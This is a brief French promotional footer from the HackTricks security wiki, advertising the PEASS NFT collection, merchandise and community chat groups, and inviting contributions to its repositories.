* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
